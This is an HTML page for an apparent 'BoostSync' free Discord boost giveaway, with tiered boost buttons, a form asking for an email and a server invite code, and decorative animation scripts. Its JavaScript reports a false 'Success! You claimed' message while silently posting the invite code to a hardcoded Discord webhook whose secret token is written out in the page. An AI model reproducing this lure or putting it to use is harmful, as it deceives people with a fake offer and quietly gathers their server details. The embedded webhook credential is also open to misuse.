<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>BoostSync — Boost Selection</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
<style>
:root{
  --bg:#050506;
  --accent:#45a29e;
  --muted:#9aa0a6;
  --white:#ffffff;
}
body{
  margin:0;
  font-family:Inter,sans-serif;
  background:var(--bg);
  color:#fff;
  overflow:hidden;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  position:relative;
}
canvas#bgCanvas{
  position:absolute;
  top:0; left:0;
  width:100%; height:100%;
  pointer-events:none;
}
.panel{
  background:rgba(11,12,16,0.95);
  padding:40px;
  border-radius:22px;
  width:420px;
  text-align:center;
  position:relative;
  border:2px solid var(--white);
  box-shadow:0 0 50px rgba(255,255,255,0.05);
}
h2{
  font-family:Orbitron,sans-serif;
  margin-bottom:28px;
  color:#e6f7f5;
  text-shadow:0 0 10px rgba(255,255,255,0.25);
}
.boost-btn{
  width:100%;
  padding:16px;
  margin:12px 0;
  border:none;
  border-radius:14px;
  background:#1f2833;
  color:#fff;
  cursor:pointer;
  font-weight:700;
  font-size:16px;
  transition:.3s, box-shadow .3s;
}
.boost-btn:hover{
  background:#45a29e;
}
.boost-btn[disabled]{
  opacity:0.3;
  cursor:not-allowed;
  background:#111418;
}
input{
  width:100%;
  padding:14px;
  margin:10px 0;
  border-radius:12px;
  border:1px solid var(--white);
  background:rgba(255,255,255,0.05);
  color:#fff;
}
.btn-submit{
  background:var(--white);
  color:#050506;
  margin-top:10px;
  cursor:pointer;
  border:none;
  border-radius:12px;
  font-weight:700;
  font-size:16px;
  transition:.2s;
}
.btn-submit:hover{
  background:#f1f1f1;
}
@keyframes glowEffect {
  0% { box-shadow: 0 0 6px var(--white),0 0 12px rgba(255,255,255,0.2); transform: scale(1);}
  50%{ box-shadow:0 0 20px var(--white),0 0 40px rgba(255,255,255,0.4); transform: scale(1.05);}
  100%{ box-shadow:0 0 6px var(--white),0 0 12px rgba(255,255,255,0.2); transform: scale(1);}
}
.glow { animation: glowEffect 1s ease-in-out; }
</style>
</head>
<body>

<canvas id="bgCanvas"></canvas>

<div class="panel">
  <h2>Boost Selection</h2>
  <div id="boostList">
    <button class="boost-btn" data-boost="2">Starter Boost — 2x</button>
    <button class="boost-btn" data-boost="5" disabled>Power Boost — 5x</button>
    <button class="boost-btn" data-boost="15" disabled>Ultra Boost — 15x</button>
  </div>

  <div id="emailSection" style="display:none;">
    <input id="emailInput" type="email" placeholder="Enter your email">
    <input id="inviteCode" type="text" placeholder="Enter server invite code">
    <button class="boost-btn btn-submit" id="sendWebhook">Submit</button>
  </div>

  <div id="statusMsg" style="margin-top:12px;color:#9aa0a6;"></div>
</div>

<audio id="bgMusic" loop autoplay>
  <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
</audio>

<script>
// ================== Progressive Boost Logic ==================
const boostButtons = document.querySelectorAll('.boost-btn[data-boost]');
const emailSection = document.getElementById('emailSection');
const sendBtn = document.getElementById('sendWebhook');
const statusMsg = document.getElementById('statusMsg');

let selectedBoost = null;
let claimedBoosts = JSON.parse(localStorage.getItem('claimedBoosts') || '[]');

function refreshBoosts(){
  boostButtons.forEach(btn=>{
    const boostVal = parseInt(btn.dataset.boost);
    if(boostVal === 2){ btn.disabled = claimedBoosts.includes(2); }
    else if(boostVal === 5){ btn.disabled = !claimedBoosts.includes(2) || claimedBoosts.includes(5); }
    else if(boostVal === 15){ btn.disabled = !claimedBoosts.includes(5) || claimedBoosts.includes(15); }
    btn.textContent = claimedBoosts.includes(boostVal) ? `CLAIMED — ${boostVal}x` : btn.textContent;
  });
}

function animateGlow(btn){
  btn.classList.add('glow');
  setTimeout(()=>btn.classList.remove('glow'),1000);
}

boostButtons.forEach(btn=>{
  btn.addEventListener('click',()=>{
    selectedBoost = parseInt(btn.dataset.boost);
    boostButtons.forEach(b=>b.disabled=true);
    emailSection.style.display = 'block';
    statusMsg.textContent = `You selected: ${selectedBoost}x boost. Enter email and server invite.`;
    animateGlow(btn);
  });
});

sendBtn.addEventListener('click',()=>{
  const email = document.getElementById('emailInput').value.trim();
  const invite = document.getElementById('inviteCode').value.trim();
  if(!email || !invite){
    statusMsg.textContent = 'Please fill in both fields.';
    return;
  }

  if(!claimedBoosts.includes(selectedBoost)){
    claimedBoosts.push(selectedBoost);
    localStorage.setItem('claimedBoosts', JSON.stringify(claimedBoosts));
  }

  refreshBoosts();
  emailSection.style.display = 'none';
  statusMsg.textContent = `Success! You claimed ${selectedBoost}x boost.`;

  // Send to webhook without email
  fetch('https://discord.com/api/webhooks/1424415820557324360/F6-l4lJnCcXtm6ovyaAngHxEE9-8rsEu77lMOZxVMXc_HTAZSDIdzTF327k7n5wVzUwP', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({
      embeds:[{
        title:"Boost Claimed",
        color:65280,
        fields:[
          {name:"Boost", value:selectedBoost+'x', inline:true},
          {name:"Server Invite Code", value:invite, inline:true}
        ]
      }]
    })
  }).catch(console.error);

  boostButtons.forEach(btn=>{
    if(!btn.disabled) animateGlow(btn);
  });
});

refreshBoosts();

// ================== Background particle canvas ==================
const canvas = document.getElementById('bgCanvas');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

let particles = [];
for(let i=0;i<80;i++){
  particles.push({
    x: Math.random()*canvas.width,
    y: Math.random()*canvas.height,
    r: Math.random()*2+1,
    alpha: Math.random()*0.5+0.2
  });
}

function drawParticles(){
  ctx.clearRect(0,0,canvas.width,canvas.height);
  particles.forEach(p=>{
    ctx.beginPath();
    ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
    ctx.fillStyle=`rgba(255,255,255,${p.alpha})`;
    ctx.fill();
  });
}

function animateParticles(){
  particles.forEach(p=>{
    p.y -= 0.1;
    if(p.y<0) p.y = canvas.height;
  });
  drawParticles();
  requestAnimationFrame(animateParticles);
}
animateParticles();

// ================== Mouse/finger trail ==================
let trail = [];
function addTrail(x,y){ trail.push({x,y,alpha:1}); }

function drawTrail(){
  for(let i=0;i<trail.length-1;i++){
    const t = trail[i];
    const next = trail[i+1];
    ctx.strokeStyle=`rgba(255,255,255,${t.alpha})`;
    ctx.lineWidth=2;
    ctx.beginPath();
    ctx.moveTo(t.x,t.y);
    ctx.lineTo(next.x,next.y);
    ctx.stroke();
    t.alpha -= 0.02;
    if(t.alpha<=0){ trail.splice(i,1); i--; }
  }
}
function animateTrail(){ drawTrail(); requestAnimationFrame(animateTrail); }
animateTrail();

document.addEventListener('mousemove', e=>{ addTrail(e.clientX,e.clientY); });
document.addEventListener('touchmove', e=>{
  for(let touch of e.touches){ addTrail(touch.clientX,touch.clientY); }
});

window.addEventListener('resize', ()=>{
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
});
</script>

</body>
</html>
